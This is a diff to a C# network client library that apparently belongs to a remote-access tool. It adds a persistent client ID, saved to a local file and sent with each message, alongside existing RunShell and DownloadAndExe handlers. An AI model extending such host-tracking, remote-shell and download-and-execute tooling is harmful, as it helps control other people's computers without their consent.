@@ -16,9 +16,23 @@ namespace ClientLibrary
         private NetworkStream _netstream;
         private TcpClient _client;
         private CancellationTokenSource _token;
+        private int _ID;
         private StreamWriter ShellWriter;
         private Process processCmd;
         private StringBuilder strInput;
+        private Task handleRequest;
+
+        public int myID
+        {
+            get
+            {
+                return this._ID;
+            }
+            private set
+            {
+                this._ID = value;
+            }
+        }
 
         private NetworkStream netStream
         {
@@ -65,6 +79,7 @@ namespace ClientLibrary
             this.myClient = null;
             this.netStream = null;
             this.cToken = null;
+            this.myID = 0;
         }
 
         /// <summary>
@@ -82,7 +97,10 @@ namespace ClientLibrary
                 this.cToken = new CancellationTokenSource();
                 cToken.Token.Register(() => this.myClient.Close());
 
-                await HandleClientRequest();
+                this.handleRequest = HandleClientRequest();
+
+                await GetId();
+                
             }
             catch (Exception ex)
             {
@@ -103,6 +121,79 @@ namespace ClientLibrary
             }
         }
 
+        private async Task GetId()
+        {
+            if (this.myID != 0)
+            { }
+            else
+            {
+                string path = Directory.GetParent(System.Reflection.Assembly.GetExecutingAssembly().Location).FullName;
+                string fileName = Path.Combine(path, "Id.text");
+
+                //FileStream fs = new FileStream();
+                if (!File.Exists(fileName))
+                {
+                    await AskForId();
+                }
+
+                else
+                {
+                    string myText = File.ReadAllText(fileName);
+
+                    int fID;
+                    if (int.TryParse(myText, out fID))
+                    {
+                        this.myID = fID;
+                    }
+                    else
+                        await AskForId();
+
+                }
+            }
+        }
+
+        private async Task createIdFile(int Id)
+        {
+            string path = Directory.GetParent(System.Reflection.Assembly.GetExecutingAssembly().Location).FullName;
+            string fileName = Path.Combine(path, "Id.text");
+
+            // Create the file.
+            using (FileStream fs = File.Create(fileName))
+            {
+                Byte[] info =
+                    new UTF8Encoding(true).GetBytes(Id.ToString());
+
+                // Add some information to the file.
+                 await fs.WriteAsync(info, 0, info.Length);
+            }
+
+            this.myID = Id;
+        }
+
+        private async Task AskForId()
+        {
+            try
+            {
+                if (this.myClient.Connected)
+                {
+                    byte[] data = new byte[0];
+
+                    ServerClientMessage myMessage = new ServerClientMessage(MessageType.askClientID, 0, new byte[0], this.myID);
+
+                    data = myMessage.serialize();
+
+                    await this.netStream.WriteAsync(data, 0, data.Length);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+            finally
+            {
+            }
+        }
+
         /// <summary>
         /// Ask file from the server
         /// </summary>
@@ -115,7 +206,7 @@ namespace ClientLibrary
                 if (this.myClient.Connected)
                 {
                     byte[] data = Encoding.ASCII.GetBytes(FileName);
-                    ServerClientMessage myMessage = new ServerClientMessage(MessageType.AskForFile, data.Length, data);
+                    ServerClientMessage myMessage = new ServerClientMessage(MessageType.AskForFile, data.Length, data, this.myID);
 
                     data = myMessage.serialize();
 
@@ -150,7 +241,7 @@ namespace ClientLibrary
                     int NoOfPackets = Convert.ToInt32(Math.Ceiling(Convert.ToDouble(Fs.Length) / Convert.ToDouble(1024)));
                     int TotalLength = (int)Fs.Length, CurrentPacketLength;
 
-                    ServerClientMessage myMessage = new ServerClientMessage(MessageType.DownloadAndExe, TotalLength);
+                    ServerClientMessage myMessage = new ServerClientMessage(MessageType.DownloadAndExe, TotalLength, this.myID);
 
                     for (int i = 0; i < NoOfPackets; i++)
                     {
@@ -212,6 +303,16 @@ namespace ClientLibrary
                                     RunShell();
                                     break;
                                 }
+                            case MessageType.askClientID:
+                                {
+
+                                    break;
+                                }
+                            case MessageType.GetClientID:
+                                {
+                                    await createIdFile(recivedMessage.ID);
+                                    break;
+                                }
                             default:
                                 {
                                     Console.WriteLine("Invalid message type");
@@ -239,7 +340,7 @@ namespace ClientLibrary
                 if (this.myClient.Connected)
                 {
                     byte[] data = new byte[0];
-                    ServerClientMessage myMessage = new ServerClientMessage(MessageType.RunShell, data.Length, data);
+                    ServerClientMessage myMessage = new ServerClientMessage(MessageType.RunShell, data.Length, data, this.myID);
 
                     data = myMessage.serialize();
 
